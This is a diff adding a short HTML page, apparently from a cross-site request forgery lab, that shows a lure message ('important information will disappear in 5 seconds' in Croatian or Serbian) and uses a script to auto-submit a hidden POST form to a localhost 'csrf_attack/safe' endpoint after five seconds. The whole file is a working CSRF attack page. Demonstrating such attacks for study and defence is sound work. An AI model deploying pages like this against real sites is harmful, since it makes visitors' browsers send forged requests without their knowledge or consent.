@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<head>  <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <link rel="stylesheet" href="/style.css" />
+    
+    </head>
+<body>
+    
+    <section id="user-input">
+       <div>Važna informacija će nestati za 5 sekundi</div>
+       <form method="POST" id="ff" action="http://localhost:3000/csrf_attack/safe">
+       </form>
+    </section>
+    <script>
+        
+        window.setTimeout(function() { document.getElementById('ff').submit(); }, 5000);
+    </script>
+      
+</body>
